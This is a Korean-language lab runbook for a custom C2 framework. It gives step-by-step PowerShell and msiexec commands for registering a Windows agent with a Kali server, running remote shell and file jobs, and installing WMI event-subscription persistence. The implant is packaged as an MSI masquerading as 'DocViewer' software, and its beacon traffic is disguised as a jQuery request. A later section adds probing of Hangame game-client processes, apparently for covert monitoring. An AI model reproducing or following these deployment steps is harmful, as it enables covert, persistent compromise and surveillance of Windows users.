# Windows VM — 다음에 하면 되는 것 (원샷)

> **작성일**: 2026-07-31  
> **전제**: Kali에서 c2server 기동 + VM이 `C2_HOST:8443` 도달 가능  
> **기본 시크릿**: `config.lab.env` 와 **동일**해야 함 (아래 값)

## 0. Kali 쪽 (서버)

```bash
cd outputs/c2-project   # 또는 복사해 둔 경로
source config.lab.env
# 외부 VM 접속이면 이미 0.0.0.0:8443
./bin/c2server
# 다른 터미널에서 확인
curl -sk -H "X-Auth-Token: $ADMIN_TOKEN" https://127.0.0.1:8443/health
```

방화벽/VPN: VM → Kali IP:8443/tcp 허용.

## 1. VM으로 복사할 최소 세트

| 경로 | 필수 |
|------|------|
| `bin/agent.exe` | ✅ |
| `bin/loader.dll` | ✅ (WMI) |
| `bin/persistence/wmi_install.ps1` | ✅ (WMI) |
| `scripts/smoke_windows.ps1` | ✅ |
| `scripts/wmi_live_test.ps1` | 권장 (2단계) |
| `scripts/msi_install_lab.ps1` | 권장 (3단계) |
| `msi/package.ps1` + `deploy/msi_stage/*` | MSI 시 |
| `certs/server.crt` | (참고; 에이전트는 insecure skip) |

전체 폴더를 그대로 복사해도 됨.

## 2. 1단계 — 통신 스모크 (필수)

**관리자 PowerShell** 권장 (WMI 섹션 포함 시 필수).

```powershell
cd <c2-project 복사 경로>

$env:C2_HOST      = "<kali-ip>"                 # 예: 192.168.56.1
$env:C2_PORT      = "8443"
$env:ADMIN_TOKEN  = "lab-admin-token-change-me"
$env:AGENT_TOKEN  = "lab-agent-token-change-me"
$env:C2_PSK       = "lab-psk-change-me"         # config.lab.env 와 동일!
$env:SMOKE_TRANSPORT = "both"                   # wss | http | both
# $env:SMOKE_SKIP_WMI = "1"                     # 통신만 먼저 볼 때

.\scripts\smoke_windows.ps1
# 종료 코드 0 = 전부 PASS
# 결과 파일: data/smoke_windows_last.json , data/smoke_windows_last.md
```

### 합격 기준 (자동 검사 항목)

- [x] `GET /health` OK  
- [ ] WSS register + shell `win-smoke-ok`  
- [ ] HTTP beacon register + shell  
- [ ] upload → `%TEMP%\c2_smoke_upload.txt` 존재  
- [ ] download job done  
- [ ] ping job  
- [ ] (admin) WMI install → filter 존재 → uninstall clean  

통과 후:

1. `data/smoke_windows_last.md` 내용을 `SMOKE_windows.md` **결과 표**에 붙이거나  
2. 아래 2–3단계 진행.

## 3. 2단계 — WMI 영속 live (에이전트 온라인까지)

스모크의 WMI 섹션은 **install/status/uninstall 클린** 위주.  
**notepad 트리거 후 helper가 C2에 붙는지**는 별도:

```powershell
$env:C2_HOST     = "<kali-ip>"
$env:ADMIN_TOKEN = "lab-admin-token-change-me"
$env:AGENT_TOKEN = "lab-agent-token-change-me"
$env:C2_PSK      = "lab-psk-change-me"
# 스테이징 + 환경 주입 후 트리거
.\scripts\wmi_live_test.ps1
```

기대:

1. `C:\ProgramData\DocViewer\DocViewerCore.dll` + `DocViewerHelper.exe` 스테이징  
2. WMI filter `DocViewerUpdateEvent`  
3. `notepad` 기동 → `rundll32 ...,EntryPoint` → Helper 기동  
4. `/admin/agents` 에 windows 에이전트 등장  
5. 스크립트 끝에서 uninstall (남기지 않음)

## 4. 3단계 — MSI 실설치

**WiX Toolset v3.11+** 필요.

```powershell
# 빌드 + (선택) 설치
.\scripts\msi_install_lab.ps1 -Install
# 또는 단계별:
.\msi\package.ps1
msiexec /i deploy\DocViewer_Setup.msi /qb
# 확인 후
msiexec /x deploy\DocViewer_Setup.msi /qb
```

MSI CustomAction: `rundll32.exe [#LoaderDLL],EntryPoint`  
설치 폴더: `Program Files\DocViewer\` (`DocViewerHelper.exe` + `DocViewerCore.dll`).

## 5. 시크릿 정합 (자주 깨지는 부분)

| 키 | **정본** (`config.lab.env`) | 잘못된 예시 |
|----|-----------------------------|-------------|
| `C2_PSK` | `lab-psk-change-me` | `lab-psk-v14-change-me` ← 구문서 |
| `ADMIN_TOKEN` | `lab-admin-token-change-me` | |
| `AGENT_TOKEN` | `lab-agent-token-change-me` | |

서버를 `source config.lab.env` 로 띄웠다면 VM도 **같은 세 값**을 써야 한다.  
실운영 값으로 바꿨으면 **양쪽에 동일하게** 넣고 git에 커밋하지 말 것.

## 6. 실패 시 빠른 체크

| 증상 | 볼 곳 |
|------|--------|
| health 실패 | Kali IP/방화벽, c2server 기동, 포트 8443 |
| register 없음 | `C2_PSK`/`AGENT_TOKEN` 불일치, transport path (`/socket/v1`, `/jquery.min.js`) |
| shell timeout | 에이전트 프로세스 살아 있는지, 서버 job 큐 |
| WMI skipped | 관리자 PowerShell 아님 |
| rundll32 후 무반응 | `loader.dll` EntryPoint export, Helper가 같은 폴더에 있는지 |
| MSI candle 실패 | WiX PATH, wxs Source 경로 |

## 7. 순서 요약

```
Kali: c2server up
   → VM: smoke_windows.ps1     (통신 + 가벼운 WMI)
   → SMOKE_windows.md 결과 표 갱신
   → VM: wmi_live_test.ps1     (트리거→에이전트 온라인)
   → VM: msi_install_lab.ps1   (WiX 빌드·설치)
```

이 Kali 박스에서는 Windows PE **실행 검증을 하지 않는다** (정책). 라이브 결과는 반드시 VM 로그/표로만 확정.


## v1.4.3 추가 체크

```powershell
# 1) process names (with real 한게임 client if available)
.\scripts\hangame_proc_probe.ps1

# 2) full smoke — faster poll for gate test
$env:GAME_POLL_SEC = "5"
.\scripts\smoke_windows.ps1
```

Expect: hangame section OK with fake baduki image name; WMI install/uninstall clean when elevated.
See also `docs/stream-enable-gate.md`, `docs/wmi-persistence.md`.
